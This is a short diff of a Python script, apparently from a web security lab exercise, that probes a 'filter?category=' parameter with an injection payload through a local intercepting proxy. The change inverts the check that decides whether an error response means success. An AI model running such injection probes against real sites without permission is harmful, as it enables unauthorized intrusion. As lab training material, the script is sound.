@@ -8,7 +8,7 @@ proxies = {'http:': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 def exploit(url, payload):
     uri = "filter?category="
     request = requests.get(url + uri + payload, verify=False, proxies=proxies)
-    if "Internal Server Error" in request.text:
+    if "Internal Server Error" not in request.text:
         return True
     else:
         return False
